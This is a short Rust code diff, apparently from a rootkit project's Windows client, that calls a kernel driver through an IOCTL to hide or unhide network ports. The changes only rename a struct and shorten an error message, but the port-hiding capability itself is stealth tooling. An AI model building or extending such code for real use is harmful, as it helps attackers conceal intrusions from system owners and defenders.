@@ -1,6 +1,6 @@
 use {
     log::*, 
-    shared::structs::PortInfo,
+    common::structs::TargetPort,
     std::{ptr::null_mut, ffi::c_void},
     crate::utils::{open_driver, PortType, Protocol},
     windows_sys::Win32::{
@@ -15,12 +15,12 @@ pub struct Port {
 
 impl Port {
     pub fn new() -> Self {
-        let driver_handle = open_driver().expect("Failed to open driver");
+        let driver_handle = open_driver().expect("Error");
         Port { driver_handle }
     }
 
     pub fn hide_unhide_port(self, ioctl_code: u32, protocol: Protocol, port_type: PortType, port_number: u16, enable: bool) {
-        let mut port_info = PortInfo {
+        let mut port_info = TargetPort {
             protocol: protocol.to_shared(),
             port_type: port_type.to_shared(),
             port_number,
@@ -33,7 +33,7 @@ impl Port {
                 self.driver_handle,
                 ioctl_code,
                 &mut port_info as *mut _ as *mut c_void,
-                size_of::<PortInfo>() as u32,
+                size_of::<TargetPort>() as u32,
                 null_mut(),
                 0,
                 &mut return_buffer,
